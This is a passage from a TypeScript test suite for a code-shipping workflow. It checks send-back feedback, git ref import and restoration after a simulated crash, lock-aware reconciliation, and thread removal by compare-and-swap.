    expect(sendBackFlexible(store, { taskId: first.taskId, by: { name: "alex", generation: store.accountOf("alex")!.generation }, feedback: "Rename the helper, please.", now: NOW }))
      .toEqual({ ok: true, thread: thread.id, feedback: "Rename the helper, please." });
    expect(state(first.ship)).toBe("sent-back");
    expect(store.getTask(first.taskId)?.state).toBe("cancelled");
    built(first.taskId, first.candidate);
    expect(await step(first.taskId)).toMatchObject({ ok: false, reason: "wrong-state" });
    const second = commit({ "a.txt": "renamed\n" });
    const shown = await terms();
    expect(shown.terms).toMatchObject({ seq: 2, importRef: flexibleImportRef(thread.id, 2), candidate: second });
    expect(await press(shown)).toMatchObject({ ok: true, seq: 2 });
    expect(tgit(world.project, "rev-parse", `refs/heads/toolroll/code-${thread.id}`)).toBe(second);
    expect(tgit(world.project, "rev-parse", flexibleImportRef(thread.id, 1))).toBe(first.candidate);
    expect(ships().map(row => [row["seq"], row["state"]])).toEqual([[1, "sent-back"], [2, "armed"]]);
  });
});

describe("crashes and removal", () => {
  const plantApproved = (id: string, candidate: string) => store.handle.prepare(`INSERT INTO flexible_ship (id, thread, seq, repo, base_sha, candidate, import_ref, branch, terms_json, digest, summary_key, approved_by, approved_generation, proof, approved_at, delegation_id, state, state_at)
    VALUES (?, ?, 1, ?, ?, ?, ?, ?, '{}', ?, ?, 'alex', 1, 'password-now', ?, 1, 'approved', ?)`).run(id, thread.id, world.project, world.second, candidate, flexibleImportRef(thread.id, 1), `toolroll/code-${thread.id}`, id, "e".repeat(32), NOW.toISOString(), NOW.toISOString());

  test("a Ship a crash left mid-import is settled on restart: its refs put back by compare-and-swap, failed, and shippable again", async () => {
    const before = projectRefs();
    const candidate = commit({ "a.txt": "one\n" });
    // The crash: the import moved the refs, and the process died before the Ship's row moved on.
    expect(await importFlexibleCandidate(store, { thread: thread.id, seq: 1, expected: candidate, branchBefore: null, by: "alex", now: NOW })).toMatchObject({ ok: true });
    const id = "9".repeat(32);
    plantApproved(id, candidate);
    expect(projectRefs()).not.toBe(before);
    // While another holder has the thread's lock, its Ship is live, not crashed: left alone.
    let release!: () => void;
    const held = withFlexibleThreadLock(thread.id, () => new Promise<void>(done => { release = done; }));
    await new Promise(done => setTimeout(done, 50));
    const busy = await new Promise<unknown>(done => { setImmediate(() => { void reconcileFlexibleShips(store, { now: NOW, lockWaitMs: 50 }).then(done); }); });
    release();
    await held;
    expect(busy).toEqual({ ok: true, settled: 0 });
    expect(state(id)).toBe("approved");
    expect(await pass()).toMatchObject({ ok: true, reconciled: 1 });
    expect(store.handle.prepare("SELECT state, reason, detail FROM flexible_ship WHERE id = ?").get(id)).toMatchObject({ state: "failed", reason: "interrupted", detail: expect.stringContaining("import ref removed, thread branch restored") });
    expect(projectRefs()).toBe(before);
    const again = await terms();
    expect(again.terms.seq).toBe(2);
    expect(await press(again)).toMatchObject({ ok: true, seq: 2 });
  });

  test("a crash before the import moved anything settles with the refs untouched", async () => {
    const candidate = commit({ "a.txt": "one\n" });
    const before = projectRefs();
    const id = "8".repeat(32);
    plantApproved(id, candidate);
    expect(await reconcileFlexibleShips(store, { now: NOW })).toEqual({ ok: true, settled: 1 });
    expect(store.handle.prepare("SELECT detail FROM flexible_ship WHERE id = ?").get(id)!["detail"]).toContain("import ref absent, thread branch untouched");
    expect(projectRefs()).toBe(before);
  });

  test("removing a thread removes its import refs and branch by compare-and-swap, and is refused while a Ship is armed", async () => {
    const before = projectRefs();
    const one = await shipped();
    expect(await removeFlexibleThread(store, { id: thread.id, by: "alex", now: NOW })).toMatchObject({ ok: false, reason: "thread-shipping" });
    sendBackFlexible(store, { taskId: one.taskId, by: { name: "alex", generation: store.accountOf("alex")!.generation }, feedback: "Not this one.", now: NOW });
    expect(await removeFlexibleThread(store, { id: thread.id, by: "alex", now: NOW })).toMatchObject({ ok: true, keepRef: "removed" });
    // Left: only the check task's own branch (it belongs to the task, not the thread).
    expect(projectRefs()).toBe([...before.split("\n").filter(line => !line.startsWith(`refs/toolroll/threads/${thread.id}/`)), `refs/heads/${taskBranch(one.taskId)} ${world.second}`].sort().join("\n"));
    expect(store.handle.prepare("SELECT detail FROM action_ledger WHERE action = 'flexible thread repository removed'").get()!["detail"]).toContain("ship refs removed 2");
  });
});
